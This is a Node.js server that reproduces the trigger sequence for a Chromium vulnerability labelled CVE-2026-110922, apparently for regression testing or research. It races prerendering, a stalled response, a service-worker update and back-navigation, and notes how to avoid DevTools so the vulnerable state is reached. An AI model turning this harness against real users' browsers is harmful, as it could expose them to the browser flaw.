/**
 * Shared scenario server for CVE-2026-110922.
 *
 * Serves the URL layout of the upstream regression test and runs the whole
 * sequence from page JavaScript, so the browser can be driven without any
 * DevTools/CDP session attached.
 *
 * Why this exists: `devtools_instrumentation::IsPrerenderAllowed()` returns
 * false when a DevTools session lacks "tab target support". Playwright's
 * sessions do, so Chromium rejects every prerender with
 * `kPrerenderingDisabledByDevTools` (PrerenderFinalStatus 69). A CDP-driven
 * browser therefore never reaches the vulnerable preconditions. Launching
 * Chromium directly and letting the page drive itself avoids that entirely.
 */

import { createServer } from "node:http";

const PAGE_HEAD = "<!doctype html><meta charset=\"utf-8\">";

const SW_V1 = `self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
`;

const SW_V2 = `self.addEventListener('install', () => {});
self.addEventListener('activate', (e) => e.waitUntil(Promise.all([
  self.clients.claim(),
  fetch('/sw2-activated').catch(() => {}),
])));
self.addEventListener('message', (e) => {
  if (e.data && e.data.type === 'SKIP_WAITING') self.skipWaiting();
});
`;

function page({ title, drive, delayMs, prerenderCount, hint, origin }) {
  const rules = JSON.stringify({
    prerender: [
      {
        source: "list",
        urls: [origin + "/empty.html?prerender=1"],
        ...(hint ? { expects_no_vary_search: 'params=("prerender")' } : {}),
      },
      ...(prerenderCount > 1
        ? [
            {
              source: "list",
              urls: Array.from(
                { length: prerenderCount - 1 },
                (_, k) => `${origin}/empty.html?prerender${k + 2}`,
              ),
            },
          ]
        : []),
    ],
  });

  return `${PAGE_HEAD}<title>${title}</title>
<script>
window.__PAGESHOW = null;
// sendBeacon survives service worker version changes and page freezing, unlike
// fetch() from a page that is being evicted/restored.
window.addEventListener('pageshow', (e) => {
  window.__PAGESHOW = { persisted: e.persisted, at: Date.now() };
  navigator.sendBeacon('/report?outcome=pageshow&persisted=' + e.persisted +
                       '&url=' + encodeURIComponent(location.href));
});
window.addEventListener('pagehide', (e) => {
  navigator.sendBeacon('/report?outcome=pagehide&persisted=' + e.persisted +
                       '&url=' + encodeURIComponent(location.href));
});

(async () => {
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const status = () => fetch('/status').then((r) => r.json());
  const report = (q) => fetch('/report?' + q).catch(() => {});

  // Register service worker v1 and wait until it controls this page.
  if (!navigator.serviceWorker.controller) {
    const reg = await navigator.serviceWorker.register('/sw.js?v=1', { scope: '/' });
    await navigator.serviceWorker.ready;
    if (!navigator.serviceWorker.controller) {
      await new Promise((r) =>
        navigator.serviceWorker.addEventListener('controllerchange', r, { once: true }));
    }
  }
  window.__A_READY = true;
  navigator.sendBeacon('/report?outcome=script-start&navtype=' +
    encodeURIComponent((performance.getEntriesByType('navigation')[0] || {}).type || '?') +
    '&url=' + encodeURIComponent(location.href));
  await report('outcome=ready&url=' + encodeURIComponent(location.href));

  if (!${drive} ) return;

  if (new URL(location.href).searchParams.has('next')) {
    // Phase 2: install rules, queue prerender 2, race the SW update with back.
    await report('outcome=phase2');
    const s = document.createElement('script');
    s.type = 'speculationrules';
    s.textContent = ${JSON.stringify(rules)};
    document.head.appendChild(s);

    // Wait until the server has the in-flight prerender request.
    for (let i = 0; i < 120; i++) {
      if ((await status()).stall > 0) break;
      await sleep(50);
    }
    await report('outcome=stalled');
    await sleep(400); // let prerender 2 sit in pending_prerenders_

    await fetch('/bump');
    await report('outcome=bumped');

    const reg = await navigator.serviceWorker.getRegistration();
    await reg.update().catch(() => {});
    const waiting = await new Promise((resolve) => {
      if (reg.waiting) return resolve(reg.waiting);
      const timer = setTimeout(() => resolve(null), 3000);
      reg.addEventListener('updatefound', () => {
        const worker = reg.installing;
        if (!worker) return;
        worker.addEventListener('statechange', () => {
          if (worker.state === 'installed') {
            clearTimeout(timer);
            resolve(worker);
          }
        });
      });
    });
    await report('outcome=waiting&got=' + Boolean(waiting));
    if (waiting) waiting.postMessage({ type: 'SKIP_WAITING' });
    await sleep(${delayMs});
    await report('outcome=backing');
    history.back();
    return;
  }

  // Phase 1: leave the initial page so it becomes a BFCache candidate.
  // A BFCache restore or reload of this URL must not start a second round.
  if (sessionStorage.getItem('phase1Done') === '1') {
    await report('outcome=phase1-replay');
    return;
  }
  sessionStorage.setItem('phase1Done', '1');
  await sleep(50);
  // Keep the tuning knobs across the phase change.
  const q = new URLSearchParams(location.search);
  q.set('next', '');
  location.href = '/empty.html?' + q.toString();
})();
</script>`;
}

export function startScenarioServer({ servePrerender1 = false, origin = "http://127.0.0.1" } = {}) {
  const state = {
    stall: 0,
    prerenderRequested: 0,
    swVersion: 1,
    sw2ActivatedAt: null,
    reports: [],
    requests: [],
  };

  const server = createServer((req, res) => {
    const url = new URL(req.url, "http://127.0.0.1");
    const origin = `http://${req.headers.host}`;
    const send = (code, type, body, cache = "no-cache") => {
      res.writeHead(code, { "Content-Type": type, "Cache-Control": cache });
      res.end(body);
    };

    if (url.pathname === "/status") {
      return send(200, "application/json", JSON.stringify(state));
    }
    if (url.pathname === "/report") {
      state.reports.push({ at: Date.now(), q: Object.fromEntries(url.searchParams) });
      return send(200, "application/json", "{}");
    }
    if (url.pathname === "/sw2-activated") {
      state.sw2ActivatedAt = Date.now();
      state.reports.push({ at: Date.now(), q: { outcome: "sw2-activated" } });
      return send(200, "application/json", "{}");
    }
    if (url.pathname === "/bump") {
      state.swVersion = 2;
      return send(200, "application/json", "{}");
    }
    if (url.pathname === "/sw.js") {
      return send(200, "text/javascript", state.swVersion === 2 ? SW_V2 : SW_V1);
    }
    if (url.pathname === "/empty.html") {
      const purpose = req.headers["sec-purpose"] ?? req.headers["purpose"] ?? "";
      const isPrerenderParam = url.searchParams.has("prerender");
      const isQueued = [...url.searchParams.keys()].some((k) => /^prerender\d+$/.test(k));

      state.requests.push({
        at: Date.now(),
        search: url.search,
        purpose,
      });

      if (isPrerenderParam) {
        state.prerenderRequested++;
        // Hold the running prerender in flight: never send a response, so
        // PrerenderHost::were_headers_received() stays false and the
        // No-Vary-Search *hint* is the only thing that can match it.
        if (!servePrerender1) {
          state.stall++;
          return; // intentionally no response
        }
        return send(200, "text/html; charset=utf-8", page({
          title: "prerender1",
          drive: false,
          delayMs: 0,
          prerenderCount: 1,
          hint: true,
          origin,
        }));
      }
      if (isQueued) {
        // A queued prerender only executes this if it actually commits (i.e.
        // it was started because the running prerender got cancelled). A
        // prefetch of the same URL never runs scripts, so this is a reliable
        // signal that the pending prerender started.
        return send(200, "text/html; charset=utf-8", `${PAGE_HEAD}<title>queued</title>
<script>navigator.sendBeacon('/report?outcome=queued-load&url=' + encodeURIComponent(location.href));</script>
queued`);
      }
      if (url.searchParams.has("next")) {
        return send(200, "text/html; charset=utf-8", page({
          title: "next",
          drive: true,
          delayMs: Number(url.searchParams.get("delay") ?? 0),
          prerenderCount: Number(url.searchParams.get("count") ?? 2),
          hint: url.searchParams.get("hint") !== "0",
          origin,
        }));
      }
      return send(200, "text/html; charset=utf-8", page({
        title: "initial",
        drive: url.searchParams.has("drive"),
        delayMs: 0,
        prerenderCount: 2,
        hint: true,
        origin,
      }));
    }
    return send(404, "text/plain", "not found");
  });

  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      resolve({ server, state, base: `http://127.0.0.1:${server.address().port}` });
    });
  });
}
